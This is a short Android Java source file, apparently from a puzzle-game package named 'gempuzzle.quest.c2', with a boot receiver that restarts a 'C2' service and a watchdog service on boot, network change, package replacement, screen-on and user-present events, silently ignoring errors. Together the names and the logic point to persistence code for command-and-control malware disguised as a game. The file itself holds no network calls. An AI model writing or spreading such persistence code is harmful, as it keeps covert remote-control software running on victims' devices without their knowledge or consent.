package com.gempuzzle.quest.c2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Boot receiver — 8 triggers. Restarts C2 service on boot,
 * network change, package replace, screen on, user present.
 */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : "";
        if (action == null) action = "";
        // Always restart C2 service on any trigger
        try {
            Intent svc = new Intent(context, C2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc);
            } else {
                context.startService(svc);
            }
        } catch (Throwable ignored) {}
        // Also kick watchdog
        try {
            context.startService(new Intent(context, WatchdogService.class));
        } catch (Throwable ignored) {}
    }
}
